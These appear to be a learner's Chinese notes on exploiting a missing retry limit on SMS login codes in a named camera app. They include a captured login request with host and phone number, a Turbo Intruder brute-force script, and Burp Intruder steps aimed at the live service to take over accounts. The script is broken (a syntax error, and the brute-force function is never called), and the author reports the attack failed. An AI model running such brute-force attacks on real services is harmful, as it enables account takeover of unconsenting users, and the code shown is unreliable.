>当大家在网站或者app上点击发送短信验证码后，有没有发现过: 当你尝试了好几次错误输入之后，再输入正确的短信验证码，仍然能登录成功。
>原因：这就是验证码没有设置错误次数上限，很多网站和APP都存在这个漏洞，虽然简单，但存在确实很广泛。

“星眼”APP， 一个摄像头的APP客户端。这里就存在这个漏洞，可以登录其他人的账号。 
## 1. 配置 burp 抓手机包
通过[配置步骤](https://szukevin.site/2020/08/16/BurpSuite%E6%8A%93IOS%E8%AE%BE%E5%A4%87HTTPS%E6%B5%81%E9%87%8F/)可以用burpsuit抓手机的包
在“星眼”app注册账号，登陆时，当我们点击发送登陆验证码，随便输入比如1782，然后抓包。以下是抓到的登陆请求：
```text
POST /login/VerificationCode HTTP/1.1
Host: xyx.wiki
Accept: */*
Content-Type: application/json
Content-Length: 47
Version: 1.6
Terminaltype: ios
User-Agent: StarEyeCN/1.6 (iPhone; iOS 17.0; Scale/3.00)
Accept-Language: zh-Hans-CN
Accept-Encoding: gzip, deflate
Connection: close

{"validateCode":"1782","telephone":15898529966}
```

## 2. 为 turbo intruder 写脚本
根据[参考代码](https://blog.csdn.net/m0_49835838/article/details/125584169 )写出如下脚本:

```python
from itertools import product

def brute_verify_code_4(target, engine):
    pattern = "0123456789"
    # itertools 模块中的 product 函数：生成所有由 pattern 中字符组成的 4 位长度的排列组合(元组类型)
    for i in list(product(pattern, repeat = 4)) 
        code = ''.join(i)
        # 将元组i中的元素（一个个字符）连接成一个字符串 code
        # 例如，('0', '1', '2', '3') -> 0123
        engine.queue(target.req, code)

def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=30,                   
        requestsPerConnection=100,
        pipeline=True
    )

def handleResponse(req, interesting):
    table.add(req)
```

但是老师说要并发请求才用这个，这里直接用自带的intruder来爆破即可
## 3. 使用 intruder 爆破
太慢，可以尝试：
- 改一下线程数
- 在vps爆破（不懂）

把数据包发送到intruder中，从0000到9999进行爆破：
![[CleanShot 2023-07-26 at 00.06.33@2x.png]]
![[CleanShot 2023-07-26 at 00.07.20@2x.png]]
但是爆破完显示所有返回结果都相同(length均为198，按道理会有一个不同的)...均为false...没有成功
暂不知道为啥
![[CleanShot 2023-07-26 at 00.09.27@2x.png]]
